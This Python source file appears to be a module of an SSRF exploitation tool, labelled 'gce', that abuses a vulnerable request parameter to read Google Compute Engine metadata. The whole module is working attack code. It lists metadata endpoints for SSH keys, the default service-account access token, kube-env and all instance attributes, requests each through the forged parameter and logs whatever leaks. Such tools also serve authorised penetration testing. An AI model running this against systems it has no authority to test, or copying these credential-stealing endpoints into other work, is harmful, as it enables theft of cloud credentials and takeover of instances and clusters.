import logging
import os
from typing import List, Set, Tuple

from ssrfmap.core.utils import diff_text, wrapper_http

name = "gce"
description = "Access sensitive data from GCE"
author = "mrtc0"
documentation: List[str] = [
    "https://cloud.google.com/compute/docs/storing-retrieving-metadata",
    "https://hackerone.com/reports/341876",
    "https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/",
]


class exploit:
    endpoints: Set[Tuple[str, str]] = set()

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], "80")
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(payload))
                    logging.debug(diff)

    def add_endpoints(self):
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
            )
        )
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/instance/service-accounts/default/token",
            )
        )
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/instance/attributes/kube-env?alt=json",
            )
        )
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json",
            )
        )
